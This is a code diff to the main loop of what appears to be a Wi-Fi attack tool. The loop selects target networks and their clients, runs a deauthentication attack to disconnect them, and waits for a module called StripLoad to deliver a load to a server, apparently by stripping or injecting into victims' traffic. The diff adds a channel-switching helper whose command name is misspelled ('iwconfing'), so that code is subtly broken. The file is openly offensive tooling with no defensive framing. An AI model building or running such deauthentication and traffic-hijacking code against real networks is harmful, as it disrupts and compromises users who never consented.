@@ -5,8 +5,14 @@ import stripload
 import attacker
 import exceptions
 import time
+import subprocess
 
-TIMEOUT = 5 * 60
+ATTACK_TIMEOUT = 3 * 60
+INTEL_TIMEOUT = 1 * 60
+
+def set_channel(iface, channel):
+    subprocess.check_call(["iwconfing", iface, "channel", str(channel)])
+
 
 def str2addr(s):
     ip,port = s.split(":")
@@ -21,17 +27,18 @@ def main(args):
     intel = intel_collector.IntelCollector(parsed.iface)
     stripper = stripload.StripLoad(parsed.iface, str2addr(parsed.server))
     stripper.start()
+    intel.start()
     failed = []
 
     while True:
-        intel.start()
-        now = time.time()
-        target, clients = intel.choose_target(ignore=[f[0] for f in failed if now - f[1] < TIMEOUT / 2], timeout=TIMEOUT)
-        intel.stop()
+        intel.active()
+        ignored_targets= [f[0] for f in failed if time.time() - f[1] < ATTACK_TIMEOUT / 2]
+        target, clients = intel.choose_target(INTEL_TIMEOUT, ignore=ignored_targets)
+        intel.passive()
         attack = attacker.DeauthAttacker(parsed.iface, target, client=clients[0] if clients else None)
         attack.start()
         try:
-            stripper.wait_load(target, TIMEOUT)
+            stripper.wait_load(target, ATTACK_TIMEOUT)
         except exceptions.Exception:
             failed.append((target, time.time()))
 
